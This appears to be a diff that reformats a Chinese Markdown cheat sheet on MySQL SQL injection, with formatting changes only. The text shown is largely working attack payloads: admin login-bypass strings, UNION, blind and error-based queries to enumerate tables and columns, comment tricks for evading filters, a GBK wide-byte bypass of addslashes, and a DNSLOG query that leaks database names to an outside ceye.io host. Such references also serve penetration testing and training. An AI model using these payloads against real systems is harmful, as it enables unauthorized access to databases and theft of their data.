@@ -2,41 +2,40 @@
 
 ## 基本概念
 
--   SQL 注入是一种将 SQL 代码插入或添加到应用（用户）的输入参数中，之后再将这些参数传递给后台的 SQL 服务器加以解析并执行的攻击。
--   攻击者能够修改 SQL 语句，该进程将与执行命令的组件（如数据库服务器、应用服务器或 WEB 服务器）拥有相同的权限。
--   如果 WEB 应用开发人员无法确保在将从 WEB 表单、cookie、输入参数等收到的值传递给 SQL 查询（该查询在数据库服务器上执行）之前已经对其进行过验证，通常就会出现 SQL 注入漏洞。
+* SQL 注入是一种将 SQL 代码插入或添加到应用（用户）的输入参数中，之后再将这些参数传递给后台的 SQL 服务器加以解析并执行的攻击。
+* 攻击者能够修改 SQL 语句，该进程将与执行命令的组件（如数据库服务器、应用服务器或 WEB 服务器）拥有相同的权限。
+* 如果 WEB 应用开发人员无法确保在将从 WEB 表单、cookie、输入参数等收到的值传递给 SQL 查询（该查询在数据库服务器上执行）之前已经对其进行过验证，通常就会出现 SQL 注入漏洞。
 
 ## 常用工具
 
--   Burp Suite：[Burp Suite 使用介绍](http://drops.xmd5.com/static/drops/tools-1548.html)
--   Tamper Data (Firefox addon)
--   HackBar (Firefox addon)
--   sqlmap：[sqlmap 用户手册](http://drops.xmd5.com/static/drops/tips-143.html)
+* Burp Suite：[Burp Suite 使用介绍](http://drops.xmd5.com/static/drops/tools-1548.html)
+* Tamper Data (Browser addon)
+* HackBar (Browser addon)
+* sqlmap：[sqlmap 用户手册](http://drops.xmd5.com/static/drops/tips-143.html)
 
 ## 注入常见参数
 
--   `user()`：当前数据库用户
--   `database()`：当前数据库名
--   `version()`：当前使用的数据库版本
--   `@@datadir`：数据库存储数据路径
--   `concat()`：联合数据，用于联合两条数据结果。如 `concat(username,0x3a,password)`
--   `group_concat()`：和 `concat()` 类似，如 `group_concat(DISTINCT+user,0x3a,password)`，用于把多条数据一次注入出来
--   `concat_ws()`：用法类似
--   `hex()` 和 `unhex()`：用于 hex 编码解码
--   `load_file()`：以文本方式读取文件，在 Windows 中，路径设置为 `\\`
--   `select xxoo into outfile '路径'`：权限较高时可直接写文件
+* `user()`：当前数据库用户
+* `database()`：当前数据库名
+* `version()`：当前使用的数据库版本
+* `@@datadir`：数据库存储数据路径
+* `concat()`：联合数据，用于联合两条数据结果。如 `concat(username,0x3a,password)`
+* `group_concat()`：和 `concat()` 类似，如 `group_concat(DISTINCT+user,0x3a,password)`，用于把多条数据一次注入出来
+* `concat_ws()`：用法类似
+* `hex()` 和 `unhex()`：用于 hex 编码解码
+* `load_file()`：以文本方式读取文件，在 Windows 中，路径设置为 `\\`
+* `select xxoo into outfile '路径'`：权限较高时可直接写文件
 
 ## 语法参考与小技巧
 
 ### 行间注释
 
--   `--`
+*   `--`
 
     ```sql
     DROP sampletable;--
     ```
-
--   `#`
+*   `#`
 
     ```sql
     DROP sampletable;#
@@ -44,13 +43,12 @@
 
 ### 行内注释
 
--   `/*注释内容*/`
+*   `/*注释内容*/`
 
     ```sql
     DROP/*comment*/sampletable`   DR/**/OP/*绕过过滤*/sampletable`   SELECT/*替换空格*/password/**/FROM/**/Members
     ```
-
--   `/*! MYSQL专属 */`
+*   `/*! MYSQL专属 */`
 
     ```sql
     SELECT /*!32302 1/0, */ 1 FROM tablename
@@ -58,20 +56,20 @@
 
 ### 字符串编码
 
--   `ASCII()`：返回字符的 ASCII 码值
--   `CHAR()`：把整数转换为对应的字符
+* `ASCII()`：返回字符的 ASCII 码值
+* `CHAR()`：把整数转换为对应的字符
 
 ## 后台万能密码
 
--   `admin' --`
--   `admin' #`
--   `admin'/*`
--   `' or 1=1--`
--   `' or 1=1#`
--   `' or 1=1/*`
--   `') or '1'='1--`
--   `') or ('1'='1--`
--   以不同的用户登陆 `' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--`
+* `admin' --`
+* `admin' #`
+* `admin'/*`
+* `' or 1=1--`
+* `' or 1=1#`
+* `' or 1=1/*`
+* `') or '1'='1--`
+* `') or ('1'='1--`
+* 以不同的用户登陆 `' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--`
 
 ## 注入语句备忘
 
@@ -84,7 +82,7 @@ SELECT schema_name FROM information_schema.schemata;
 
 ### 表名
 
--   union 查询
+*   union 查询
 
     ```sql
     --MySQL 4版本时用version=9，MySQL 5版本时用version=10
@@ -92,14 +90,12 @@ SELECT schema_name FROM information_schema.schemata;
     UNION SELECT TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA=database();   /* 列出所有用户自定义数据库中的表 */
     SELECT table_schema, table_name FROM information_schema.tables WHERE table_schema!='information_schema' AND table_schema!='mysql';
     ```
-
--   盲注
+*   盲注
 
     ```sql
     AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables > 'A'
     ```
-
--   报错
+*   报错
 
     ```sql
     AND(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),FLOOR(RAND(0)*2))) (@:=1)||@ GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),!@) HAVING @||MIN(@:=0); AND ExtractValue(1, CONCAT(0x5c, (SELECT table_name FROM information_schema.tables LIMIT 1)));
@@ -108,19 +104,17 @@ SELECT schema_name FROM information_schema.schemata;
 
 ### 列名
 
--   union 查询
+*   union 查询
 
     ```sql
     UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = 'tablename'
     ```
-
--   盲注
+*   盲注
 
     ```sql
     AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns > 'A'
     ```
-
--   报错
+*   报错
 
     ```sql
     -- 在5.1.5版本中成功
@@ -128,8 +122,7 @@ SELECT schema_name FROM information_schema.schemata;
     -- MySQL 5.1版本修复了
     AND(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY CONCAT((SELECT column_name FROM information_schema.columns LIMIT 1),FLOOR(RAND(0)*2))) (@:=1)||@ GROUP BY CONCAT((SELECT column_name FROM information_schema.columns LIMIT 1),!@) HAVING @||MIN(@:=0); AND ExtractValue(1, CONCAT(0x5c, (SELECT column_name FROM information_schema.columns LIMIT 1)));
     ```
-
--   利用 `PROCEDURE ANALYSE()`
+*   利用 `PROCEDURE ANALYSE()`
 
     ```sql
     -- 这个需要 web 展示页面有你所注入查询的一个字段
@@ -214,8 +207,7 @@ http://www.test.com/list.php?order=rand((select char(substring(table_name,1,1)) 
 
 ### 宽字节注入
 
-国内最常使用的 GBK 编码，这种方式主要是绕过 `addslashes` 等对特殊字符进行转移的绕过。反斜杠 `\` 的十六进制为 `%5c`，在你输入 `%bf%27` 时，函数遇到单引号自动转移加入 `\`，此时变为 `%bf%5c%27`，`%bf%5c`
-在 GBK 中变为一个宽字符「縗」。`%bf` 那个位置可以是 `%81-%fe` 中间的任何字符。不止在 SQL 注入中，宽字符注入在很多地方都可以应用。
+国内最常使用的 GBK 编码，这种方式主要是绕过 `addslashes` 等对特殊字符进行转移的绕过。反斜杠 `\` 的十六进制为 `%5c`，在你输入 `%bf%27` 时，函数遇到单引号自动转移加入 `\`，此时变为 `%bf%5c%27`，`%bf%5c` 在 GBK 中变为一个宽字符「縗」。`%bf` 那个位置可以是 `%81-%fe` 中间的任何字符。不止在 SQL 注入中，宽字符注入在很多地方都可以应用。
 
 ### DNSLOG注入
 
@@ -243,12 +235,13 @@ mysql> select load_file(concat('\\\\',(select database()),'.xxx.ceye.io\\abc'));
 +----------------------------------------------------------------------+
 1 row in set (0.00 sec)
 ```
-![](./php/figure/preg_match/sqli1.png)
+
+![](../php/figure/preg\_match/sqli1.png)
 
 ## 参考资料
 
--   [SQL 注入速查表](http://drops.xmd5.com/static/drops/tips-7840.html)
--   [MySQL 注入技巧](http://drops.xmd5.com/static/drops/tips-7299.html)
--   [MySQL 注入科普](http://drops.xmd5.com/static/drops/tips-123.html)
--   [MySQL 注入总结](http://www.91ri.org/4073.html)
--   [《SQL 注入攻击与防御》](http://product.dangdang.com/23364650.html)
+* [SQL 注入速查表](http://drops.xmd5.com/static/drops/tips-7840.html)
+* [MySQL 注入技巧](http://drops.xmd5.com/static/drops/tips-7299.html)
+* [MySQL 注入科普](http://drops.xmd5.com/static/drops/tips-123.html)
+* [MySQL 注入总结](http://www.91ri.org/4073.html)
+* [《SQL 注入攻击与防御》](http://product.dangdang.com/23364650.html)
